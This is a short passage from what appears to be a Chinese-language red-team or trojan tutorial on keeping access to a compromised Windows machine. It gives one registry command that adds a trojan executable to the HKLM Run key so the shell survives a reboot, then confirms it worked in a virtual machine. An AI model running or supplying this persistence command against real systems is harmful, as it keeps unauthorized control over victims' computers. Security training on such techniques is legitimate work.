## 0x04 权限维持

  

一般情况下，如果不进行权限维持的操作的话，目标用户重启电脑后，shell就掉了，除非再次运行这个木马程序。所以我们需要进行权限的维持操作

最简单的就是添加注册表自启动

```
shell reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "shell\_regedit" /t REG\_SZ /d "C:\\Users\\Public\\hoshinoGen.exe" /f
```

这里的文件路径就很简单了，因为默认会跑到C盘Users下Public下，所以我们直接填这个路径就行了

![](../Images/aa73e0a4cbff6fba1008191d6cc9ef70.png)

进虚拟机查看一下注册表信息

可以看到成功加进了开机自启

![](../Images/167a24c444ea8c9c1b9aed318beb9149.png)

这样就算目标用户重启电脑也不会掉权限了
